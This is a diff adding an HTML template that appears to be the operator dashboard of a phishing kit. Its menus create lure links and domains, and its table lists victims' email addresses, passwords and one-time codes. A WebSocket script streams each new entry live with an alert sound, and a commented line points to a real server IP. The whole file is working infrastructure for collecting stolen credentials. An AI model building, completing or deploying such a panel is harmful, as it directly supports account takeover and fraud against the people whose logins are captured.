@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+	<link rel="stylesheet" type="text/css" href="/files/style.css">
+	<link rel="stylesheet" type="text/css" href="/files/normalize.min.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+<body class="crm_body_bg">
+
+
+ 
+
+
+<nav class="sidebar">
+<div class="logo d-flex justify-content-between">
+<div class="sidebar_close_icon d-lg-none">
+<i class="ti-close"></i>
+</div>
+</div>
+<ul id="sidebar_menu" class="metismenu">
+<li class="">
+<a class="has-arrow" href="/logs" aria-expanded="false">
+<div class="nav_icon_small">
+<img src="/files/img/6.svg" alt="">
+</div>
+<div class="nav_title">
+<span>Logs</span>
+</div>
+</a>
+<ul class="mm-collapse mm-show" style="">
+<li><a href="#" style=" grid-gap: 0px; color: #3eaeec;
+"><i class="fa fa-reply-all" aria-hidden="true"></i>New logs</a></li>
+</ul>
+</li><li class="">
+<a class="has-arrow" href="/links" aria-expanded="false">
+<div class="nav_icon_small">
+<img src="/files/img/2.svg" alt="">
+</div>
+<div class="nav_title">
+<span>links</span>
+</div>
+</a>
+<ul class="mm-collapse mm-show" style="">
+<li><a style=" grid-gap: 0px; ;
+" href="/create-link"><i class="fa fa-plus-square" aria-hidden="true"></i>Create link</a></li>
+</ul>
+</li><li class="">
+<a class="has-arrow" href="/domains" aria-expanded="false">
+<div class="nav_icon_small">
+<img src="/files/img/3.svg" alt="">
+</div>
+<div class="nav_title">
+<span>Domains</span>
+</div>
+</a>
+<ul class="mm-collapse mm-show" style="">
+<li><a style="grid-gap: 0px; ;
+" href="/create-domain"><i class="fa fa-plus-square" aria-hidden="true"></i>Add Domain</a></li>
+</ul>
+
+<li class="">
+<a class="has-arrow" href="/change-password" aria-expanded="false">
+<div class="nav_icon_small">
+<i class="fa fa-key" aria-hidden="true"></i>
+</div>
+<div class="nav_title">
+<span>Change password</span>
+</div>
+</a>
+ 
+
+
+</li>
+
+</li>
+</ul>
+</li>
+
+
+</nav>
+
+
+<section class="main_content dashboard_part large_header_bg">
+
+
+
+<div class="main_content_iner overly_inner ">
+<div class="container-fluid p-0 ">
+
+<div class="row">
+<div class="col-12">
+<div class="page_title_box d-flex flex-wrap align-items-center justify-content-between">
+<div class="page_title_left d-flex align-items-center">
+<h3 class="f_s_25 f_w_700 dark_text mr_30">New Logs</h3>
+
+</div>
+<div class="page_title_right">
+ 
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="col-lg-12">
+<div class="white_card card_height_100 mb_30 pt-4">
+<div class="white_card_body">
+<div class="QA_section">
+<div class="white_box_tittle list_header">
+<h4>All Log New Logs / </h4><h4 style="margin-left: 6px;"> </h4>
+<div class="box_right d-flex lms_block">
+ 
+
+</div>
+</div>
+
+
+<div class="QA_table mb_30">
+
+<div id="DataTables_Table_0_wrapper" class="dataTables_wrapper no-footer"><table class="table lms_table_active dataTable no-footer dtr-inline" id="DataTables_Table_0" role="grid" aria-describedby="DataTables_Table_0_info" style="width: 1046px;">
+<thead>
+<tr role="row"><th scope="col" class="sorting_asc" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1" colspan="1" style="width: 39px;" aria-sort="ascending" aria-label="id: activate to sort column descending">id</th> <th scope="col" class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1" colspan="1" style="width: 116px;" aria-label="Username: activate to sort column ascending">Code</th><th scope="col" class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1" colspan="1" style="width: 140px;" aria-label="Username: activate to sort column ascending">Email Address</th><th scope="col" class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1" colspan="1" style="width: 140px;" aria-label="Email Address: activate to sort column ascending">Password</th><th scope="col" class="sorting" tabindex="0" aria-controls="DataTables_Table_0" rowspan="1" colspan="1" style="width: 140px;" aria-label="Status: activate to sort column ascending">Status</th></tr>
+</thead>
+<tbody id="table">
+
+{% for log in logs %}
+
+<tr role="row" class="odd" id="{{log['id']}}">
+<th scope="row" tabindex="0" class="sorting_1"> <a href="#" class="question_content">{{log['id']}}</a></th>
+<td id="{{log['id']}}-code">{{log['code']}}</td>
+<td>{{log['mail']}}</td>
+<td>{{log['password']}}</td>
+<td style=""><a href="#" class="status_btn">Active</a></td>
+</tr>
+
+{% end %}
+
+ </tbody>
+</table><div class="dataTables_info" id="DataTables_Table_0_info" role="status" aria-live="polite">Showing 1 to 7 of 7 entries</div><div class="dataTables_paginate paging_simple_numbers" id="DataTables_Table_0_paginate"><a onclick="paginate(this.id)"  class="paginate_button previous disabled" aria-controls="DataTables_Table_0" data-dt-idx="0" tabindex="0" id="DataTables_Table_0_previous"><i class="fa fa-chevron-left" aria-hidden="true"></i></a><span><a id="curr_page" class="paginate_button current" aria-controls="DataTables_Table_0" data-dt-idx="1" tabindex="0">1</a></span><a onclick="paginate(this.id)"  class="paginate_button next disabled" aria-controls="DataTables_Table_0" data-dt-idx="2" tabindex="0" id="DataTables_Table_0_next"><i class="fa fa-chevron-right" aria-hidden="true"></i></a></div></div>
+</div>
+
+
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="footer_part">
+<div class="container-fluid">
+<div class="row">
+<div class="col-lg-12">
+<div class="footer_iner text-center">
+<p>2023 © Admin panel -   by <a href="#"> <i class="ti-heart"></i> </a><a href="#">  JE Develops</a></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+
+<style type="text/css">
+	
+	.main_content {
+    background-color: #131520;
+}
+
+</style>
+
+<script type="text/javascript">
+	
+	//uri = 'ws://212.113.106.67:8000/live-logs'
+	uri = 'ws://127.0.0.1:8888/live-logs'
+	let  ws = new WebSocket(uri);
+
+	let table = document.getElementById('table');
+
+	ws.onopen = function(e){
+		ws.send(JSON.stringify({
+				'type': 'BEGIN',
+			}))
+	}
+
+	function sound() {
+		  var audio = new Audio();  
+		  audio.src = '/files/push.mp3';  
+		  audio.autoplay = true;  
+		}
+	
+
+	ws.onmessage = function(data){
+		data = JSON.parse(data.data)
+		data.forEach((item, index, arr) => {
+			if (Number(table.rows[0].id) < Number(item.id)){
+							row = $(`<tr role="row" class="odd" id="${item.id}"></tr>`)
+
+							col1 = $(`<th scope="row" tabindex="0" class="sorting_1"> <a href="#" class="question_content"><!-- ЗНАЧЕНИЕ АЙДИ -->  ${item.id}</a></th>`)
+							col5 = $(`<td id="${item.id}-code">${item.code}</td>`)
+							col2 = $(`<td><!-- ПОЧТА -->${item.mail}</td>`)
+							col3 = $(`<td><!-- ПАРОЛЬ --> ${item.password}</td>`)
+							col4 = $(`<td style=""><a href="#" class="status_btn">Active</a></td>`)
+
+							row.append(col1, col5, col2, col3, col4).prependTo('#table')
+							sound()
+			}
+
+			if (item.code === document.getElementById(item.id + '-code').innerHTML){
+				return
+			}
+
+			row = $(`<tr role="row" class="odd" id="${item.id}"></tr>`)
+
+			col1 = $(`<th scope="row" tabindex="0" class="sorting_1"> <a href="#" class="question_content"><!-- ЗНАЧЕНИЕ АЙДИ -->  ${item.id}</a></th>`)
+			col5 = $(`<td id="${item.id}-code">${item.code}</td>`)
+			col2 = $(`<td><!-- ПОЧТА -->${item.mail}</td>`)
+			col3 = $(`<td><!-- ПАРОЛЬ --> ${item.password}</td>`)
+			col4 = $(`<td style=""><a href="#" class="status_btn">Active</a></td>`)
+			sound()
+			row.append(col1, col5, col2, col3, col4).prependTo('#table')
+		})
+	}
+
+	setInterval(() => { 
+
+		last_id = table.rows[table.rows.length-1].id
+		ws.send(JSON.stringify({
+		'type': 'GET_DATA',
+		'for_logs': false,
+		'last_id': last_id
+	}))}, 1000)
+
+
+
+</script>
+
+
+
+<script type="text/javascript">
+	var is_over = false;
+	
+	function paginate(type){
+		var curr_page = document.getElementById('curr_page');
+
+		if (curr_page.innerHTML === '1' && type === 'DataTables_Table_0_previous'){
+			return;
+		}
+
+		if (is_over && type === 'DataTables_Table_0_next'){
+			return
+		}		
+
+		is_over = false;
+
+		$.ajax({
+			type: 'get',
+			url: '/logs-handler',
+			dataType: 'html',
+			data: {type: 'paginate', prev_page_num: curr_page.innerHTML, pagination_type: type},
+			success: function(data){
+				var data = JSON.parse(data);
+				console.log(data)
+				var table = document.getElementById('table');
+				table.innerHTML = '';
+				data.forEach((item, index, arr) => {
+					table.innerHTML += `<tr role="row" class="odd">
+										<th scope="row" tabindex="0" class="sorting_1"> <a href="#" class="question_content">${item.id}</a></th>
+										<td><!-- КОД-->${item.code}</td>
+										<td>${item.mail}</td>
+										<td>${item.password}</td>
+										<td style=""><a href="#" class="status_btn">Active</a></td>
+										</tr>`
+					})
+
+				if (data.length != 7){
+					is_over = true;
+				}
+
+				if (type === 'DataTables_Table_0_next'){
+					curr_page.innerHTML = Number(curr_page.innerHTML) + 1;
+				}
+				else {
+					curr_page.innerHTML = Number(curr_page.innerHTML) - 1;
+			}
+		}})
+	}
+
+
+
+</script>
+
+
+</body>
+</html>
